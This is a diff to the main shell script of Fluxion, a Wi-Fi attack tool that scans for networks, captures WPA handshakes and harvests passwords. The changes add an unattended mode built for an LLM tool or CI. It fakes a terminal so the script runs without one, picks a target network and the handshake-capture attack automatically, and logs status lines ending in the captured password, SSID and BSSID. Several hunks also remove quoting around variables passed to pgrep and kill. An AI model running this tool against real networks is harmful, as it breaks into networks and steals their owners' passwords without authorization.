@@ -22,7 +22,7 @@ readonly FLUXIONNoiseFloor=-90
 readonly FLUXIONNoiseCeiling=-60
 
 readonly FLUXIONVersion=6
-readonly FLUXIONRevision=26
+readonly FLUXIONRevision=30
 
 # Declare window ration bigger = smaller windows
 FLUXIONWindowRatio=4
@@ -33,8 +33,6 @@ FLUXIONSkipDependencies=1
 # Check if there are any missing dependencies
 FLUXIONMissingDependencies=0
 
-# Allow to use 5ghz support
-FLUXIONEnable5GHZ=0
 
 # ============================================================ #
 # ================= < Script Sanity Checks > ================= #
@@ -60,6 +58,14 @@ fi
 # Save original args for tmux re-exec.
 readonly FLUXIONOriginalArgs=$(printf '%q ' "$@")
 
+# If stdin is not a TTY (e.g., running from an LLM tool or CI) and we need
+# tmux mode, re-exec under script(1) to allocate a pseudo-terminal.
+if [ ! -t 0 ] && [ -z "$FLUXION_HAS_PTY" ] && [ "$FLUXIONPreParseTMux" ]; then
+  export FLUXION_HAS_PTY=1
+  exec 3>&1
+  exec script -qc "$0 $FLUXIONOriginalArgs" /dev/null
+fi
+
 # ===================== < Display Checks > ===================== #
 if [ "$FLUXIONPreParseScanOnly" ] || [ "$FLUXIONPreParseListIfaces" ] || [ "$FLUXIONPreParseHelp" ]; then
   # These modes don't need a display at all.
@@ -76,6 +82,12 @@ else
       echo -e "\\033[31mAborted, no display available and tmux is not installed.\\033[0m"; exit 2
     fi
     FLUXIONPreParseTMux=1
+    # Allocate a PTY if stdin is not a terminal (LLM, CI, etc.).
+    if [ ! -t 0 ] && [ -z "$FLUXION_HAS_PTY" ]; then
+      export FLUXION_HAS_PTY=1
+      exec 3>&1
+      exec script -qc "$0 $FLUXIONOriginalArgs" /dev/null
+    fi
   fi
 fi
 
@@ -107,12 +119,26 @@ source "$FLUXIONLibPath/WindowUtils.sh"
 
 # NOTE: These are configured after arguments are loaded (later).
 
+# Write a clean timestamped status line for machine consumption (LLM, CI).
+# In auto mode: appends to /tmp/fluxspace/fluxion.status and writes to fd 3
+# (the original stdout preserved before the script(1) PTY wrapper).
+# In interactive mode: no-op.
+fluxion_status() {
+  [ "$FLUXIONAuto" ] || return 0
+  local ts=$(date '+%Y-%m-%dT%H:%M:%S')
+  local msg="[$ts] $*"
+  echo "$msg" >> "$FLUXIONWorkspacePath/fluxion.status" 2>/dev/null
+  if { true >&3; } 2>/dev/null; then
+    echo "$msg" >&3
+  fi
+}
+
 # ============================================================ #
 # =================== < Parse Parameters > =================== #
 # ============================================================ #
 if ! FLUXIONCLIArguments=$(
-    getopt --options="vdk5rinmthb:e:c:l:a:r" \
-      --longoptions="debug,debug-log:,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,scan-time:,scan-only,list-interfaces,interface:,jammer-interface:,ap-interface:,tracker-interface:,ap-service:,timeout:,reg-domain:" \
+    getopt --options="vdkrinmthb:e:c:l:a:r" \
+      --longoptions="debug,debug-log:,version,killer,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,scan-time:,scan-only,list-interfaces,interface:,jammer-interface:,ap-interface:,tracker-interface:,ap-service:,timeout:,reg-domain:,band:" \
       --name="FLUXION V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
   ); then
   echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
@@ -140,7 +166,6 @@ while [ "$1" != "" ] && [ "$1" != "--" ]; do
     -d|--debug) readonly FLUXIONDebug=1;;
     --debug-log) FLUXIONDebugLog="$2"; shift;;
     -k|--killer) readonly FLUXIONWIKillProcesses=1;;
-    -5|--5ghz) FLUXIONEnable5GHZ=1;;
     -r|--reloader) readonly FLUXIONWIReloadDriver=1;;
     -n|--airmon-ng) readonly FLUXIONAirmonNG=1;;
     -m|--multiplexer) readonly FLUXIONTMux=1;;
@@ -165,6 +190,7 @@ while [ "$1" != "" ] && [ "$1" != "--" ]; do
     --ap-service) FLUXIONAPService=$2; shift;;
     --timeout) FLUXIONTimeout=$2; shift;;
     --reg-domain) FLUXIONRegDomain=${2^^}; shift;;
+    --band) FLUXIONBand=$2; shift;;
   esac
   shift # Shift new parameters
 done
@@ -245,6 +271,9 @@ fi
 
 # Initialize window system (xterm or tmux).
 fluxion_window_init
+
+# Truncate status file for clean auto-mode progress reporting.
+[ "$FLUXIONAuto" ] && : > "$FLUXIONWorkspacePath/fluxion.status" 2>/dev/null
 
 # ================ < Configurable Variables > ================ #
 readonly FLUXIONPromptDefault="$CRed[${CSBlu}fluxion$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
@@ -389,6 +418,7 @@ fluxion_startup() {
     requiredCLITools+=("xterm")
   fi
 
+
     local depRetryCount=0
     while ! installer_utils_check_dependencies requiredCLITools[@]; do
         if ! installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]; then
@@ -429,6 +459,9 @@ fluxion_startup() {
 }
 
 fluxion_shutdown() {
+  # Close the clean-output fd if it was opened for the script(1) PTY wrapper.
+  { exec 3>&-; } 2>/dev/null
+
   # Clean up any tmux windows we created.
   if type -t fluxion_window_cleanup &> /dev/null; then
     fluxion_window_cleanup
@@ -460,9 +493,9 @@ fluxion_shutdown() {
     )
     if [ ! "$targetPID" ]; then continue; fi
     echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $FLUXIONKillingProcessNotice`"
-    kill -s SIGKILL "$targetPID" &> $FLUXIONOutputDevice
+    kill -s SIGKILL $targetPID &> $FLUXIONOutputDevice
   done
-  kill -s SIGKILL "$authService" &> $FLUXIONOutputDevice
+  kill -s SIGKILL $authService &> $FLUXIONOutputDevice
 
   # Assure changes are reverted if installer was activated.
   if [ "$PackageManagerCLT" ]; then
@@ -535,7 +568,7 @@ fluxion_shutdown() {
 # ============================================================ #
 # The following will kill the parent proces & all its children.
 fluxion_kill_lineage() {
-  if [ "$#" -lt 1 ]; then return -1; fi
+  if [ ${#@} -lt 1 ]; then return -1; fi
 
   if [ ! -z "$2" ]; then
     local -r options=$1
@@ -548,15 +581,15 @@ fluxion_kill_lineage() {
   # Check if the match isn't a number, but a regular expression.
   # The following might
   if ! [[ "$match" =~ ^[0-9]+$ ]]; then
-    match=$(pgrep -f "$match" 2> $FLUXIONOutputDevice)
+    match=$(pgrep -f $match 2> $FLUXIONOutputDevice)
   fi
 
   # Check if we've got something to kill, abort otherwise.
   if [ -z "$match" ]; then return -2; fi
 
-  kill $options $(pgrep -P "$match" 2> $FLUXIONOutputDevice) \
+  kill $options $(pgrep -P $match 2> $FLUXIONOutputDevice) \
     &> $FLUXIONOutputDevice
-  kill $options "$match" &> $FLUXIONOutputDevice
+  kill $options $match &> $FLUXIONOutputDevice
 }
 
 
@@ -644,6 +677,18 @@ fluxion_handle_exit() {
       echo
     else
       sleep 10
+    fi
+  fi
+
+  # Report final result for machine consumption (LLM, CI).
+  if [ "$FLUXIONAuto" ]; then
+    local _hsFile="$FLUXIONPath/attacks/Handshake Snooper/handshakes/${FluxionTargetSSIDClean}-${FluxionTargetMAC}.cap"
+    if [ -n "$_successPassword" ]; then
+      fluxion_status "RESULT password=$_successPassword ssid=$_successSSID bssid=$_successMAC"
+    elif [ -f "$_hsFile" ]; then
+      fluxion_status "RESULT handshake=$_hsFile ssid=$_successSSID bssid=$_successMAC"
+    else
+      fluxion_status "RESULT none"
     fi
   fi
 
@@ -785,7 +830,7 @@ declare -rA FLUXIONUndoable=( \
 # Yes, I know, the identifiers are fucking ugly. If only we had
 # some type of mangling with bash identifiers, that'd be great.
 fluxion_do() {
-  if [ "$#" -lt 2 ]; then return -1; fi
+  if [ ${#@} -lt 2 ]; then return -1; fi
 
   local -r __fluxion_do__namespace=$1
   local -r __fluxion_do__identifier=$2
@@ -802,7 +847,7 @@ fluxion_do() {
 }
 
 fluxion_undo() {
-  if [ "$#" -ne 1 ]; then return -1; fi
+  if [ ${#@} -ne 1 ]; then return -1; fi
 
   local -r __fluxion_undo__namespace=$1
 
@@ -835,7 +880,7 @@ fluxion_undo() {
 }
 
 fluxion_done() {
-  if [ "$#" -ne 1 ]; then return -1; fi
+  if [ ${#@} -ne 1 ]; then return -1; fi
 
   local -r __fluxion_done__namespace=$1
 
@@ -845,7 +890,7 @@ fluxion_done() {
 }
 
 fluxion_done_reset() {
-  if [ "$#" -ne 1 ]; then return -1; fi
+  if [ ${#@} -ne 1 ]; then return -1; fi
 
   local -r __fluxion_done_reset__namespace=$1
 
@@ -853,7 +898,7 @@ fluxion_done_reset() {
 }
 
 fluxion_do_sequence() {
-  if [ "$#" -ne 2 ]; then return 1; fi
+  if [ ${#@} -ne 2 ]; then return 1; fi
 
   # TODO: Implement an alternative, better method of doing
   # what this subroutine does, maybe using for-loop iteFLUXIONWindowRation.
@@ -1431,6 +1476,7 @@ fluxion_target_get_candidates() {
 
   if [ "$FLUXIONAuto" ]; then
     # In auto mode, run scanner for --scan-time seconds then kill it.
+    fluxion_status "SCAN_START interface=$1 duration=${FLUXIONScanTime}s"
     local scannerPID
     fluxion_window_open scannerPID "$FLUXIONScannerHeader" \
       "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd"
@@ -1480,6 +1526,8 @@ fluxion_target_get_candidates() {
   # Note: Don't cleanup dump* files yet - we need dump-01.kismet.netxml
   # for vendor lookup in fluxion_get_target()
 
+  fluxion_status "SCAN_COMPLETE candidates=${#FluxionTargetCandidates[@]}"
+
   if [ ${#FluxionTargetCandidates[@]} -eq 0 ]; then
     # Cleanup on failure
     sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
@@ -1497,8 +1545,10 @@ fluxion_get_target() {
   local -r interface=$1
 
   if [ "$FLUXIONAuto" ]; then
-    # Auto mode: use -c channel if provided, otherwise scan all 2.4GHz.
-    if [ "$FluxionTargetChannel" ]; then
+    # Auto mode: use --band if provided, otherwise infer from channel or default to 2.4GHz.
+    if [ "$FLUXIONBand" ]; then
+      local band="$FLUXIONBand"
+    elif [ "$FluxionTargetChannel" ]; then
       local band=""
       local firstChannel=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
       if [ -n "$firstChannel" ] && [ "$firstChannel" -le 14 ]; then
@@ -1506,10 +1556,10 @@ fluxion_get_target() {
       else
         band="a"
       fi
-      fluxion_target_get_candidates $interface "$FluxionTargetChannel" "$band"
     else
-      fluxion_target_get_candidates $interface "" "bg"
+      local band="bg"
     fi
+    fluxion_target_get_candidates $interface "$FluxionTargetChannel" "$band"
   else
     interface_bands "$interface" 2>/dev/null
     local __ifBands="${InterfaceBands:-unknown}"
@@ -1642,7 +1692,7 @@ fluxion_get_target() {
     candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")
 
     local candidateMAC=$(echo "$candidateAPInfo" | cut -d , -f 1)
-
+    
     # For Handshake Snooper: skip networks with existing handshakes
     # For other attacks: mark them but don't skip
     if [ -n "${existingHandshakes[$candidateMAC]}" ]; then
@@ -1655,7 +1705,7 @@ fluxion_get_target() {
     local i=${#candidatesMAC[@]}
 
     candidatesMAC[i]="$candidateMAC"
-
+    
     # Look up vendor from kismet netxml file first, fallback to macchanger
     if [ -n "${vendorLookup[${candidatesMAC[i]}]}" ]; then
       local vendor="${vendorLookup[${candidatesMAC[i]}]}"
@@ -1699,7 +1749,7 @@ fluxion_get_target() {
       echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
     )
     candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")
-
+    
     # Mark networks with existing handshakes with asterisk
     if [ "$FluxionAttack" != "Handshake Snooper" ] && [ -n "${existingHandshakes[$candidateMAC]}" ]; then
       candidatesHandshake[i]="*"
@@ -1797,6 +1847,7 @@ fluxion_get_target() {
     FluxionTargetMAC=${candidatesMAC[$autoTargetIndex]}
     FluxionTargetSSID=${candidatesESSID[$autoTargetIndex]}
     FluxionTargetChannel=${candidatesChannel[$autoTargetIndex]//!/}
+    fluxion_status "TARGET_SELECTED ssid=$FluxionTargetSSID bssid=$FluxionTargetMAC channel=$FluxionTargetChannel"
   else
     io_query_format_fields "$headerTitle$headerFields" \
      "$FormatApplyAutosize" \
@@ -1831,7 +1882,7 @@ fluxion_get_target() {
   sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
 
   FluxionTargetMakerID=${FluxionTargetMAC:0:8}
-
+  
   # If vendor wasn't found in kismet/list, fallback to macchanger lookup
   if [ -z "$FluxionTargetMaker" ]; then
     FluxionTargetMaker=$(
@@ -1985,6 +2036,9 @@ fluxion_target_tracker_start() {
 
 fluxion_target_unset_tracker() {
   if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi
+
+  # Deallocate the interface from FluxionInterfaces so it can be reused.
+  fluxion_deallocate_interface "$FluxionTargetTrackerInterface" 2>/dev/null
 
   FluxionTargetTrackerInterface=""
 }
@@ -2151,13 +2205,17 @@ fluxion_target_set() {
   if ! fluxion_get_target "$targetInterface"; then
     return 4
   fi
+
+  # Release the scan interface so attack steps (jammer, captor) can reuse it.
+  # The target info is already captured in FluxionTarget* variables.
+  fluxion_deallocate_interface "$targetInterface"
 }
 
 
 # =================== < Hash Subroutines > =================== #
 # Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
 fluxion_hash_verify() {
-  if [ "$#" -lt 3 ]; then return 1; fi
+  if [ ${#@} -lt 3 ]; then return 1; fi
 
   local hashPath=$1
 
@@ -2339,7 +2397,7 @@ fluxion_hash_set_path() {
 # Paramters: <defaultHashPath> <bssid> <essid>
 fluxion_hash_get_path() {
   # Assure we've got the bssid and the essid passed in.
-  if [ "$#" -lt 2 ]; then return 1; fi
+  if [ ${#@} -lt 2 ]; then return 1; fi
 
   while true; do
     fluxion_hash_unset_path
@@ -2396,8 +2454,16 @@ fluxion_set_attack() {
   readarray -t attacks < <(ls -1 "$FLUXIONPath/attacks")
 
   if [ "$FLUXIONAuto" ]; then
-    # Auto mode: use -a flag match or first attack.
-    FluxionAttack="${attacks[0]}"
+    # Auto mode: prefer Handshake Snooper (natural first step in the workflow).
+    local __a
+    for __a in "${attacks[@]}"; do
+      if [ "$__a" = "Handshake Snooper" ]; then
+        FluxionAttack="$__a"; break
+      fi
+    done
+    if [ ! "$FluxionAttack" ]; then
+      FluxionAttack="${attacks[0]}"
+    fi
     echo "Auto-selected attack: $FluxionAttack" >> "$FLUXIONOutputDevice"
     return 0
   fi
@@ -2469,7 +2535,10 @@ fluxion_unprep_attack() {
   unset load_attack
   unset save_attack
 
-  FluxionTargetTrackerInterface=""
+  if [ "$FluxionTargetTrackerInterface" ]; then
+    fluxion_deallocate_interface "$FluxionTargetTrackerInterface" 2>/dev/null
+    FluxionTargetTrackerInterface=""
+  fi
 
   return 1 # Trigger another undo since prep isn't significant.
 }
@@ -2498,7 +2567,7 @@ fluxion_prep_attack() {
   # Check if attack is targetted & set the attack target if so.
   if type -t attack_targetting_interfaces &> /dev/null; then
     echo "Calling fluxion_target_set" >> "$FLUXIONOutputDevice"
-    if ! fluxion_target_set; then
+    if ! fluxion_target_set; then 
       echo "fluxion_target_set FAILED" >> "$FLUXIONOutputDevice"
       return 3
     fi
@@ -2510,7 +2579,7 @@ fluxion_prep_attack() {
   echo "Checking for attack_tracking_interfaces" >> "$FLUXIONOutputDevice"
   if type -t attack_tracking_interfaces &> /dev/null; then
     echo "Calling fluxion_target_set_tracker" >> "$FLUXIONOutputDevice"
-    if ! fluxion_target_set_tracker; then
+    if ! fluxion_target_set_tracker; then 
       echo "fluxion_target_set_tracker FAILED" >> "$FLUXIONOutputDevice"
       return 4
     fi
@@ -2557,6 +2626,7 @@ fluxion_run_attack() {
 
   start_attack
   fluxion_target_tracker_start
+  fluxion_status "ATTACK_STARTED attack=$FluxionAttack"
 
   if [ "$FLUXIONAuto" ]; then
     # Auto mode: poll for attack self-termination (e.g., handshake captured,
@@ -2594,6 +2664,7 @@ fluxion_run_attack() {
 
     if [ $autoMaxWait -gt 0 ] && [ $autoTimeout -ge $autoMaxWait ]; then
       echo "Auto mode: timeout reached (${FLUXIONTimeout}m), stopping attack." > $FLUXIONOutputDevice
+      fluxion_status "TIMEOUT minutes=$FLUXIONTimeout"
     fi
   else
     local choices=( \
@@ -2798,6 +2869,10 @@ fluxion_scan_only() {
   local bandParam=""
   if [ "$FluxionTargetChannel" ]; then
     channelParam="--channel $FluxionTargetChannel"
+  fi
+  if [ "$FLUXIONBand" ]; then
+    bandParam="--band $FLUXIONBand"
+  elif [ "$FluxionTargetChannel" ]; then
     local firstCh=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
     if [ -n "$firstCh" ] && [ "$firstCh" -le 14 ]; then
       bandParam="--band bg"
@@ -2831,12 +2906,12 @@ fluxion_scan_only() {
 
   local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
   local candidates
-  readarray candidates < <(
+  readarray -t candidates < <(
     awk -F, "NF>=15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
     "$FLUXIONWorkspacePath/dump-01.csv"
   )
   local clients
-  readarray clients < <(
+  readarray -t clients < <(
     awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
     "$FLUXIONWorkspacePath/dump-01.csv"
   )
@@ -2882,7 +2957,7 @@ fluxion_scan_only() {
     local power=$(echo "$info" | cut -d , -f 9)
     local essid=$(echo "$info" | cut -d , -f 14 | sed 's/^ //;s/ *$//')
 
-    local clientCount=$(echo "${clients[@]}" | grep -c "$mac" 2>/dev/null || echo 0)
+    local clientCount=$(printf '%s\n' "${clients[@]}" | grep -c "$mac" 2>/dev/null; true)
 
     local vendor="${vendorLookup[$mac]}"
     if [ -z "$vendor" ]; then
